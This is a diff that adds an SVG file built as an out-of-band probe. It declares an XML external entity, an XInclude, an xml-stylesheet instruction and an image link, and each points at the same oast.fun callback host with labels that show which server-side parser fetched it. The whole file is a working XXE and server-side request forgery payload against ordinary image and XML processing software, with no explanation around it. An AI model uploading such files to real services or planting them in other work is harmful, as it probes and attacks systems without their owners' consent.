@@ -1,0 +1,10 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<?xml-stylesheet type="text/xsl" href="https://ioczmasuxkcvwrggbffg1csnwsynanrej.oast.fun/file415-server-stylesheet-7a91"?>
+<!DOCTYPE svg [
+  <!ENTITY oast SYSTEM "https://ioczmasuxkcvwrggbffg1csnwsynanrej.oast.fun/file415-server-entity-7a91">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xi="http://www.w3.org/2001/XInclude" width="760" height="140">
+  <text x="20" y="40">SERVER-ENTITY:[&oast;]</text>
+  <text x="20" y="80">SERVER-XINCLUDE:<xi:include href="https://ioczmasuxkcvwrggbffg1csnwsynanrej.oast.fun/file415-server-xinclude-7a91" parse="text"/></text>
+  <image href="https://ioczmasuxkcvwrggbffg1csnwsynanrej.oast.fun/file415-server-image-direct-7a91" x="0" y="100" width="1" height="1"/>
+</svg>
